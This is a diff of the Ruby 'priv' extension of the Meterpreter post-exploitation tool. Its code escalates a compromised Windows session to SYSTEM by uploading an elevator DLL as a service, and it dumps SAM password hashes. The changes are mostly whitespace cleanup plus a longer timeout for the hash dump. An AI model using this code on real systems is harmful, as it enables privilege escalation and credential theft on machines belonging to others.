@@ -24,10 +24,10 @@ class Priv < Extension
 	#
 	def initialize(client)
 		super(client, 'priv')
-		
+
 		client.register_extension_aliases(
 			[
-				{ 
+				{
 					'name' => 'priv',
 					'ext'  => self
 				},
@@ -36,25 +36,25 @@ class Priv < Extension
 		# Initialize sub-classes
 		self.fs = Fs.new(client)
 	end
-	
+
 	#
 	# Attempt to elevate the meterpreter to Local SYSTEM
 	#
 	def getsystem( technique=0 )
 		request = Packet.create_request( 'priv_elevate_getsystem' )
-		
-		elevator_name = Rex::Text.rand_text_alpha_lower( 6 ) 
-		
+
+		elevator_name = Rex::Text.rand_text_alpha_lower( 6 )
+
 		if( client.platform == 'x64/win64' )
 			elevator_path = ::File.join( Msf::Config.install_root, "data", "meterpreter", "elevator.x64.dll" )
 		else
 			elevator_path = ::File.join( Msf::Config.install_root, "data", "meterpreter", "elevator.dll" )
 		end
-		
+
 		elevator_path = ::File.expand_path( elevator_path )
-		
+
 		elevator_data = ""
-		
+
 		::File.open( elevator_path, "rb" ) { |f|
 			elevator_data += f.read( f.stat.size )
 		}
@@ -63,29 +63,29 @@ class Priv < Extension
 		request.add_tlv( TLV_TYPE_ELEVATE_SERVICE_NAME, elevator_name )
 		request.add_tlv( TLV_TYPE_ELEVATE_SERVICE_DLL, elevator_data )
 		request.add_tlv( TLV_TYPE_ELEVATE_SERVICE_LENGTH, elevator_data.length )
-		
+
 		# as some service routines can be slow we bump up the timeout to 90 seconds
 		response = client.send_request( request, 90 )
-		
+
 		technique = response.get_tlv_value( TLV_TYPE_ELEVATE_TECHNIQUE )
-		
+
 		if( response.result == 0 and technique != nil )
 			client.core.use( "stdapi" ) if not client.ext.aliases.include?( "stdapi" )
 			client.sys.config.getprivs
 			return [ true, technique ]
 		end
-		
+
 		return [ false, 0 ]
 	end
-	
+
 	#
 	# Returns an array of SAM hashes from the remote machine.
 	#
 	def sam_hashes
-		response = client.send_request(
-			Packet.create_request('priv_passwd_get_sam_hashes'))
+		# This can take a long long time for large domain controls, bump the timeout to one hour
+		response = client.send_request(Packet.create_request('priv_passwd_get_sam_hashes'), 3600)
 
-		response.get_tlv_value(TLV_TYPE_SAM_HASHES).split(/\n/).map { |hash| 
+		response.get_tlv_value(TLV_TYPE_SAM_HASHES).split(/\n/).map { |hash|
 			SamUser.new(hash)
 		}
 	end
@@ -102,3 +102,4 @@ protected
 end
 
 end; end; end; end; end
+
